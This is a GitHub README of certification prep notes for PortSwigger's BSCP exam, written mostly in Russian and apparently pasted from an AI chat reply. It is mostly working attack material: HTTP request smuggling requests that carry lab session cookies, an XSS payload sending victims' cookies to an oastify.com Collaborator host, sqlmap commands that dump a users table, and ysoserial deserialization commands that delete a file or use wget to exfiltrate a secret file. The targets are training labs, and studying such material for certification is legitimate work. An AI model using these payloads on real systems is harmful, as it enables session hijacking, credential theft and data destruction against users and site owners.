# BSCP-PREP-NOTES
BSCP NOTES PREPAPATION

Конечно, старина Мухаммад. Ниже — **аккуратно оформленный текст для README в GitHub**, в стиле заметок/cheat-sheet’а под **BSCP / PortSwigger mindset**.
Ты сможешь **просто скопировать и вставить** 👇
(код оставляю в code block’ах, как и положено для README)

---

# 🧠 BSCP / PortSwigger — Stage 1 Mindset & Payload Notes

## 🔑 Stage 1 — Initial Access Philosophy

> **Первые шаги почти всегда связаны с кражей cookies.**
> Неважно, какая уязвимость используется — **ключевое слово: `cookies`**.

Любая уязвимость на Stage 1 должна рассматриваться как способ:

* получить cookies жертвы
* перехватить сессию
* захватить аккаунт
* перейти к privilege escalation

---

## 🧩 Что может быть на Stage 1

### 📌 Cache / Poisoning / Smuggling

* **PortSwigger Lab: Web cache poisoning with an unkeyed header**
  ⚠️ *Обязательно использовать Burp Collaborator*

* **PortSwigger Lab: Basic password reset poisoning**

* **PortSwigger Lab: Password reset poisoning via middleware**

* **Lab: Exploiting HTTP request smuggling to deliver reflected XSS**
```html  
POST / HTTP/1.1
Host: 0ab900800495c1fc85f60e850077000a.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 242
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 920
Cookie: session=qEApwbqQoQV5bqG8LQrnAvl3VQggWnaX

csrf=Vwd8rkZxtPiqYWlzRk6hzpAPXyXMqEpY&postId=8&name=c&email=c%40c.c&website=&comment=cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccdddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddccccccccc
```
---
* **PortSwigger Lab: Password reset poisoning via middleware**
```html
POST / HTTP/1.1
Host: 0aaa00e1044cbd8e82bb5621004a006c.web-security-academy.net
Content-Length: 237
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /post?postId=4 HTTP/1.1
User-Agent: a"/><script>document.location='http://299n9jhwugy7941yfk1rcdmqdhj87zvo.oastify.com/?Hack='+document.cookie;</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

x=1
```
## 💉 XSS → Cookie Exfiltration (Classic Payload)

```html
<script>
location="https://TARGET.web-security-academy.net/?find=%22%7D%3Blocation%3D%22https%3A//YOUR-COLLABORATOR.oastify.com/%3F%22%2Bdocument.cookie%3B%2F%2F";
</script>
```
* ** Lab: Reflected XSS into HTML context with most tags and attributes blocked **
В этой лабе брутим тэги и эвенты и через exploit сервер пиздим куки юзера
📌 Используется для:

* кражи cookies
* привязки сессии
* дальнейшего lateral movement

---

## 🗄️ SQL Injection (sqlmap examples)

### 🔍 Enumerate databases

```bash
sqlmap -u "https://TARGET.web-security-academy.net/filtered_search?find=test&organize=5&order=ASC&BlogArtist=test" \
-p "order" \
--cookie="_lab=LAB_COOKIE; session=SESSION_COOKIE" \
--batch --random-agent --level 5 --risk 3 --dbs
```

### 📤 Dump users table

```bash
sqlmap -u "https://TARGET.web-security-academy.net/filtered_search?find=test&organize=5&order=ASC&BlogArtist=test" \
-p "order" \
--cookie="_lab=LAB_COOKIE; session=SESSION_COOKIE" \
--batch --random-agent --level 5 --risk 3 \
-D public -T users --dump
```

---

## ☕ Java Deserialization (ysoserial)

⚠️ **ВАЖНО**

* Payload **должен быть в одну строку**
* Payload **обязательно URL-encode**
* Часто используется `base64` / `gzip`

---

### 🧨 Delete file payload

```bash
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
--add-opens=java.base/java.lang=ALL-UNNAMED \
--add-opens=java.base/java.util=ALL-UNNAMED \
--add-opens=java.base/java.net=ALL-UNNAMED \
-jar ysoserial-all.jar CommonsCollections4 \
'rm /home/carlos/morale.txt' | base64
```

---

### 📡 Exfiltrate secret via Collaborator

```bash
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
--add-opens=java.base/java.lang=ALL-UNNAMED \
--add-opens=java.base/java.util=ALL-UNNAMED \
--add-opens=java.base/java.net=ALL-UNNAMED \
-jar ysoserial-all.jar CommonsCollections2 \
'wget http://YOUR-COLLABORATOR.oastify.com --post-file=/home/carlos/secret' \
| gzip -c -f | base64 -w 0
```

---

## ⚠️ Критические напоминания

* ❗ **ВСЕ PAYLOAD’Ы — В ОДНУ СТРОКУ**
* ❗ **ВСЕ PAYLOAD’Ы — URL ENCODE**
* ❗ Проверяй `Content-Length`
* ❗ Всегда смотри на cookies и session handling

---

## 🔐 Brute Force

🛠️ Скрипты для:

* brute-force username
* brute-force password

➡️ Уже предустановлены в **Kali Linux**
(`/usr/share/wordlists`, `hydra`, `wfuzz`, `ffuf`, `burp intruder`)

---

## 🧠 Итоговый Mindset (BSCP)

> **Если ты не думаешь о cookies — ты думаешь не в ту сторону.**
> Stage 1 = session hijack → escalation → win.

---

